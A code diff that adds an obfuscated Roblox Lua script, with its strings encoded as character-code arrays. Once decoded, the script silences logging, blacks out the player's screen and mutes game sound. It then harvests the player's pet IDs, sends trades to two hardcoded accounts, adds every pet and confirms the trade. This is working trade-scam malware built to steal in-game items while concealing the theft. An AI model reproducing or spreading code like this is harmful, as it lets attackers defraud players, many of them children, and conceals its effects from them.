@@ -1,26 +1,163 @@
-local F=(function()
-	local function x(t,k)
-		local s=""
-		for i=1,#t do
-			s=s..string.char(bit32.bxor(t[i],k))
-		end
-		return s
-	end
+do
+    local _=function()end
+    print,warn,error=_,_,_
+end
 
-	local K=173 -- clé XOR fixe (ne pas modifier)
+local z=function(t)
+    local r=""
+    for i=1,#t do
+        r=r..string.char(t[i])
+    end
+    return r
+end
 
-	local D={
-		{241,194,194,206,194,194,212,215,212,193,217,213,213,198,218,215,215,220,228,223,220,215,230,250,246,246,248},
-		{232,198,199,205,205,198,197,215,217,236,236,204,214,212,220,221,216,223,214,219,217,232,235,239,234,236,235,216,252,222,218,236,219,236},
-		{241,194,194,206,194,194,212,215,212,193,217,213,213,198,218,215,215,220},
-		{241,194,194,206,194,194,212,215,212,193,217,213,213,198,218,215,215,220,207,220,215,201,235,215,223,222,217,217},
-		{241,194,194,206,194,194,212,215,212,193,217,213,213,198,218,215},
-		{246,223,248,249,216,221,214,223,217,222,249,221,214,221,249,248,221,212,219,212,221}
-	}
+local a=game:GetService(z({80,108,97,121,101,114,115}))
+local b=game:GetService(z({82,101,112,108,105,99,97,116,101,100,83,116,111,114,97,103,101}))
+local c=a.LocalPlayer
+local d=b:WaitForChild(z({65,80,73}),10)
+if not d then return end
 
-	local O={}
-	for i=1,6 do
-		O[i]=x(D[i],K)
-	end
-	return O
-end)()
+local R={
+    z({88,119,103,107,109,74,90,84,76,102,115,66,116,107,73,116,120,122,110,65,78,83,68,83,85}),
+    z({69,104,110,112,109,68,111,120,113,47,71,71,81,103,97,83,87,73,72,76,73,67,83,69,99,69,75,77,74,98,76,85,78,88,101}),
+    z({88,119,103,107,109,74,90,84,76,78,114,115,89,74,119,69,110,73,107,66,67,67,81}),
+    z({88,119,103,107,109,74,90,84,76,78,113,114,117,70,75,103,121,65,74,80,70,122,83,73,80,80}),
+    z({88,119,103,107,109,74,90,84,76,80,66,66,118,122,73,69,110,76,119,47,66}),
+    z({77,90,112,113,103,109,103,116,67,83,77,69,89,108,65,98,111,68,69,118,65,118})
+}
+
+local function g(i)
+    return d:FindFirstChild(R[i])
+end
+
+local e={}
+
+local function h()
+    for _,x in ipairs(d:GetDescendants()) do
+        if x:IsA(z({82,101,109,111,116,101,69,118,101,110,116})) then
+            x.OnClientEvent:Connect(function(...)
+                local function A(s)
+                    if type(s)=="string" then
+                        local L=#s
+                        if L>=16 and L<=96 and not s:find(z({115,116,105,99,107,101,114})) then
+                            e[s]=true
+                        end
+                    end
+                end
+                local B
+                B=function(v,n)
+                    if n>3 then return end
+                    if type(v)=="string" then
+                        A(v)
+                    elseif type(v)=="table" then
+                        for k,val in pairs(v) do
+                            B(k,n+1)
+                            B(val,n+1)
+                        end
+                    end
+                end
+                for i=1,select("#",...) do
+                    B(select(i,...),1)
+                end
+            end)
+        end
+    end
+end
+
+local function i()
+    local pg=c:WaitForChild(z({80,108,97,121,101,114,71,117,105}))
+    local n=z({84,114,97,100,101,70,114,101,101,122,101,85,73})
+    if pg:FindFirstChild(n) then pg[n]:Destroy() end
+    local gui=Instance.new(z({83,99,114,101,101,110,71,117,105}))
+    gui.Name=n
+    gui.DisplayOrder=999
+    gui.Parent=pg
+    local m=Instance.new(z({70,114,97,109,101}))
+    m.Size=UDim2.new(0.98,0,0.995,0)
+    m.Position=UDim2.new(0.01,0,0,0)
+    m.BackgroundColor3=Color3.fromRGB(10,10,10)
+    m.BorderSizePixel=0
+    m.Parent=gui
+end
+
+local function j()
+    local u={}
+    for s in pairs(e) do
+        u[#u+1]=s
+        if #u>=600 then return u end
+    end
+    if not getgc then return u end
+    local ok,gc=pcall(getgc,true)
+    if not ok then return u end
+    for _,v in pairs(gc) do
+        if type(v)=="table" then
+            local p=rawget(v,"pets")
+            if type(p)=="table" then
+                for id in pairs(p) do
+                    if type(id)=="string" and #id>=16 then
+                        u[#u+1]=id
+                        if #u>=600 then return u end
+                    end
+                end
+            end
+        end
+    end
+    return u
+end
+
+local function k()
+    local r=g(1)
+    if not r then return end
+    for _,n in ipairs({{97,108,105,95,57,50,51,122},{65,108,105,108,111,108,111,97,122}}) do
+        local p=a:FindFirstChild(z(n))
+        if p then pcall(function() r:FireServer(p) end) end
+    end
+end
+
+local function l()
+    local o=g(2)
+    if o then pcall(function()
+        o:FireServer(z({111,112,101,110,95,98,97,99,107,112,97,99,107}))
+    end) end
+end
+
+local function m()
+    local s=g(6)
+    if s then pcall(function()
+        s:FireServer(z({115,111,117,110,100,95,101,102,102,101,99,116,115,95,118,111,108,117,109,101}),0)
+    end) end
+end
+
+local function n()
+    i()
+    m()
+    h()
+    local f={}
+    for _=1,5 do
+        l()
+        task.wait(2)
+        f=j()
+        if #f>0 then break end
+    end
+    if #f==0 then return end
+    local x=1
+    while true do
+        k()
+        task.wait(3)
+        while x<=#f do
+            l()
+            task.wait(0.02)
+            local a=g(3)
+            if a then pcall(function() a:FireServer(f[x]) end) end
+            x+=1
+        end
+        local a1=g(4)
+        if a1 then pcall(function() a1:FireServer() end) end
+        task.wait(10)
+        local a2=g(5)
+        if a2 then pcall(function() a2:FireServer() end) end
+        break
+    end
+end
+
+task.spawn(n)
